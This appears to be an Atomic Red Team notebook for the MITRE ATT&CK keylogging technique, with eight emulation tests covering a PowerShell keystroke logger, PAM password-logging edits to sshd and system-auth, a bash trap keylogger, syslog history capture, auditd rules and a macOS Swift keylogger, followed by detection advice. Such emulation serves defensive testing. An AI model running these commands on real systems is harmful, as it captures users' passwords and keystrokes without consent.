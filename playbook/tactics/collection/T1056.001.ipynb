{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "10b39057",
   "metadata": {},
   "source": "# T1056.001 - Keylogging\nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) "
  },
  {
   "cell_type": "markdown",
   "id": "39f9fa34",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "b15d9687",
   "metadata": {},
   "source": "### Atomic Test #1 - Input Capture\nUtilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null\nInvoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b35da80a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6b48d201",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath $env:TEMP\\key.log\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb16744f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "92706fa2",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item $env:TEMP\\key.log -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff7463d9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d4be2964",
   "metadata": {},
   "source": "### Atomic Test #2 - Living off the land Terminal Input Capture on Linux with pam.d\nPluggable Access Module, which is present on all modern Linux systems, generally contains a library called pam_tty_audit.so which logs all keystrokes for the selected users and sends it to audit.log.  All terminal activity on any new logins would then be archived and readable by an adversary with elevated privledges.\n\nPasswords hidden by the console can also be logged, with 'log_passwd' as in this example.  If root logging is enabled, then output from any process which is later started by root is also logged, even if this policy is carefully enabled (e.g. 'disable=*' as the initial command).\n\nUse 'aureport --tty' or other audit.d reading tools to read the log output, which is binary.  Mac OS does not currently contain the pam_tty_audit.so library. \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Checking if pam_tty_audit.so is installed\n\n##### Check Prereq Commands:\n```sh\ntest -f '/usr/lib/pam/pam_tty_audit.so -o  /usr/lib64/security/pam_tty_audit.so'\n\n```\n##### Get Prereq Commands:\n```sh\necho \"Sorry, you must install module pam_tty_audit.so and recompile, for this test to work\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25406807",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "2ff95615",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nif sudo test -f /etc/pam.d/password-auth; then sudo cp /etc/pam.d/password-auth /tmp/password-auth.bk; fi;\nif sudo test -f /etc/pam.d/system-auth; then sudo cp /etc/pam.d/system-auth /tmp/system-auth.bk; fi;\nsudo touch /tmp/password-auth.bk\nsudo touch /tmp/system-auth.bk sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/password-auth sudo echo \"session    required    pam_tty_audit.so\nenable=* log_password\" >> /etc/pam.d/system-auth\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7023491",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "eac1d38d",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo cp -f /tmp/password-auth.bk /etc/pam.d/password-auth\nsudo cp -f /tmp/system-auth.bk /etc/pam.d/system-auth\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b6b48298",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "76b3ad5d",
   "metadata": {},
   "source": "### Atomic Test #3 - Logging bash history to syslog\nThere are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires to be run in a bash shell and that logger and tee are installed.\n\n##### Check Prereq Commands:\n```sh\nif [ \"$(echo $SHELL)\" != \"/bin/bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v tee)\" ]; then echo -e \"\\n***** tee NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "627e884a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "72212566",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nPROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t \"$USER[$$] $SSH_CONNECTION \")'\necho \"\\$PROMPT_COMMAND=$PROMPT_COMMAND\"\ntail /var/log/syslog\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d8f5996d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "b97753ce",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nunset PROMPT_COMMAND\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f551361b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a4779ae2",
   "metadata": {},
   "source": "### Atomic Test #4 - Logging sh history to syslog/messages\nThere are several variables that can be set to control the appearance of the bash command prompt: PS1, PS2, PS3, PS4 and PROMPT_COMMAND. The contents of these variables are executed as if they had been typed on the command line. The PROMPT_COMMAND variable \"if set\" will be executed before the PS1 variable and can be configured to write the latest \"bash history\" entries to the syslog.\n\nTo gain persistence the command could be added to the users .shrc or .profile \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires to be run in a bash shell and that logger and tee are installed.\n\n##### Check Prereq Commands:\n```sh\nif [ \"$(echo $SHELL)\" != \"/bin/sh\" ]; then echo -e \"\\n***** sh not running! *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v logger)\" ]; then echo -e \"\\n***** logger NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "06a0fb28",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "0454c88d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nPS2=`logger -t \"$USER\" -f ~/.sh_history`\n$PS2\ntail /var/log/messages\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aed7b302",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "3c843388",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nunset PS2\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc6f0592",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "123418f6",
   "metadata": {},
   "source": "### Atomic Test #5 - Bash session based keylogger\nWhen a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = \"echo $BASH_COMMAND\". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. \n\nTo gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/ \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires to be run in a bash shell\n\n##### Check Prereq Commands:\n```bash\nif [ \"$(echo $0)\" != \"bash\" ]; then echo -e \"\\n***** Bash not running! *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "53bc38a2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "16b4d949",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ntrap 'echo \"$(date +\"%d/%m/%y %H:%M:%S.%s\") $USER $BASH_COMMAND\" >> /tmp/.keyboard.log' DEBUG\necho \"Hello World!\"\ncat /tmp/.keyboard.log\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ccdb9cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f68ceed7",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nrm /tmp/.keyboard.log\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1672a266",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "64ae1bf7",
   "metadata": {},
   "source": "### Atomic Test #6 - SSHD PAM keylogger\nLinux PAM (Pluggable Authentication Modules) is used in sshd authentication. The Linux audit tool auditd can use the pam_tty_audit module to enable auditing of TTY input and capture all keystrokes in a ssh session and place them in the /var/log/audit/audit.log file after the session closes.\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires sshd and auditd\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7462654",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7184a97b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" >> /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh ubuntu@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bbb9e2c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "02e0f73f",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\ncp -fv /tmp/sshd /etc/pam.d/\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e284214d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 6 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "53131c8d",
   "metadata": {},
   "source": "### Atomic Test #7 - Auditd keylogger\nThe linux audit tool auditd can be used to capture 32 and 64 bit command execution and place the command in the /var/log/audit/audit.log audit log. \n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: This test requires sshd and auditd\n\n##### Check Prereq Commands:\n```sh\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n\n```\n##### Get Prereq Commands:\n```sh\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26381e1a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c6564630",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nauditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start $(date +\"%d/%m/%y %H:%M:%S\") \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6bf8cd3a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "609c1da5",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsystemctl restart auditd\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "556a4625",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 7 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "f4d8d4b4",
   "metadata": {},
   "source": "### Atomic Test #8 - MacOS Swift Keylogger\nUtilizes a swift script to log keys to sout. It runs for 5 seconds then dumps the output to standard. Input Monitoring is required.\nInput Monitoring can be enabled in System Preferences > Security & Privacy > Privacy > Input Monitoring.\nReferece: https://cedowens.medium.com/taking-esf-for-a-nother-spin-6e1e6acd1b74\n\n**Supported Platforms:** macos\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: swift script must exist at #{swift_src}, and the terminal must have input monitoring permissions.\n\n##### Check Prereq Commands:\n```bash\nif [ -f PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift ]; then chmod +x PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\necho \"\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01f427df",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d448d19a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nswift PathToAtomicsFolder/T1056.001/src/MacOSKeylogger.swift -keylog\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ff44b454",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "4eec8b5d",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\nkill `pgrep swift-frontend`\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2e8bdf64",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1056.001 -TestNumbers 8 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5ad949e3",
   "metadata": {},
   "source": "## Detection\nKeyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include `SetWindowsHook`, `GetKeyState`, and `GetAsyncKeyState`.(Citation: Adventures of a Keystroke) Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}